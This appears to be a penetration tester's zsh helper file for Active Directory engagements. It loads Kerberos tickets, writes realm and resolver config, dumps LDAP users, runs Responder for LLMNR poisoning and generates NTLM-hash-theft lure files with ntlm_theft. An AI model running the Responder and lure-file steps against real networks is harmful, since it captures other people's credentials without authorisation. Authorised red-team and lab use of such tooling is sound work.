kbload(){
    echo -e "\n[+] LOADED TICKET \"$1\"\n"
    export KRB5CCNAME=$1
    klist
}

# AD Realm Setting Function
krbconf(){
    salt=$(openssl rand -hex 4)

    if [[ -f $1 ]]; then
        while read ip; do krbconf $ip; done < $1
        return 1
    fi

    echo -e "\n[+] SYNCING TIME WITH DC \"$1\"\n"
    sudo timedatectl set-ntp off
    timeout 1 sudo rdate -n $1
    sudo ntpdate -u $1

    echo -e "\n[+] ADDING AD REALM FOR \"$1\"\n"
    nxc smb $1 --generate-krb5-file /tmp/krb5conf
    if [[ ! -s /tmp/krb5conf ]]; then
        read -r manualset\?"[-] KB GENERATION FAILED, COULD NOT CONTACT SMB ON \"$1\", DO YOU STILL WANT TO ADD A REALM? (Y/N): "
        if [[ $manualset =~ [yY] ]]; then
            read -r dom\?"[+] INPUT DOMAIN: "
            read -r dc_fqdn\?"[+] INPUT DC_FQDN: "
            echo "[libdefaults]\n    dns_lookup_kdc = false\n    dns_lookup_realm = false\n    default_realm = ${dom:u}\n\n[realms]\n    ${dom:u} = {\n        kdc = $dc_fqdn\n        admin_server = $dc_fqdn\n        default_domain = $dom\n    }\n\n[domain_realm]\n    .$dom = ${dom:u}\n    $dom = ${dom:u}" > /tmp/krb5conf
        fi
        cat /tmp/krb5conf
        addhost $1 $dc_fqdn
        addhost $1 $dom
    else
        genhosts $1
    fi

    dom=$(cat /tmp/krb5conf | grep -i default_realm | awk -F"=" '{print $2}' | tr -d ' ')
    echo -e "\n[+] ADDING NS CONFIGURTATION FOR \"$1\" ON DOMAIN \"$dom\"\n"
    echo "\n#---AD GENERATED---#\ndomain $dom\nnameserver $1\n" | sudo tee --append /etc/resolv.conf

    if [[ -f /etc/krb5.conf ]]; then
        prev_dom=$(cat /etc/krb5.conf | grep -i default_realm | awk -F"=" '{print $2}' | tr -d ' ')
        if [[ ! -z $prev_dom ]]; then
            def_rlm=$(cat /tmp/krb5conf | grep -i default_realm | tr -d ' ')
            sudo sed -i -e "s/    default_realm = $prev_dom/    $def_rlm/g" /etc/krb5.conf
            sudo sed -i -e "s/    default_realm=$prev_dom/    $def_rlm/g" /etc/krb5.conf
            cat /tmp/krb5conf | tail -n 2 | while read line; do grep -qxF "    $line" /etc/krb5.conf || echo "    $line" | sudo tee --append /etc/krb5.conf; done
            rlm=$(cat /tmp/krb5conf | grep kdc | tail -n 1 | awk -F"=" '{print $2}')
            blk=$(cat /tmp/krb5conf | grep -i { -A4)
            rlm_chk=$(cat /etc/krb5.conf | grep -i $rlm)
            if [[ -z $rlm_chk ]]; then
                sudo awk -v text="$blk" '/\[realms\]/ {print; print "" text; next} 1' /etc/krb5.conf > tmp && sudo mv tmp /etc/krb5.conf
            fi
        else
            sudo mv /tmp/krb5conf /etc/krb5.conf
        fi
    else
        sudo mv /tmp/krb5conf /etc/krb5.conf
    fi
    rm /tmp/krb5conf &>/dev/null
}

# Ldap domain dump
ldapdump(){
    if [ $# -lt 3 ]; then
        echo "Usage: ldapdump <DOMAIN\\user> <password> <ip>"
        return 1
    fi
    
    local domain_user="$1"
    local password="$2"
    local ip="$3"
    
    if [ -z "$password" ]; then
        ldapdomaindump -u "$domain_user" -o . "$ip"
    else
        ldapdomaindump -u "$domain_user" -p "$password" -o . "$ip"
    fi
    
    echo "Extracting usernames and saving them in ~/machines/user.txt"
    cat domain_users.json | grep -i samaccountname -A1 | grep -vi samaccountname | grep -v - | tr -d '>' | sort -u > ~/machines/user.txt
    
    echo -e "\n[*] Info and Descriptions:"
    cat domain_users.json | grep -Ei 'info|description' -A1
}

#Responder Server
respond(){
    chnic
    sudo responder -I $inter -wdv
}

# LLMNR File Generator
ntlmtheft(){
    cd /home/damuna/tools/ntlm_theft
    rm -rf /home/damuna/tools/ntlm_theft/NTDOCS
    python3 ntlm_theft.py -g all -s $1 -f NTDOCS
}

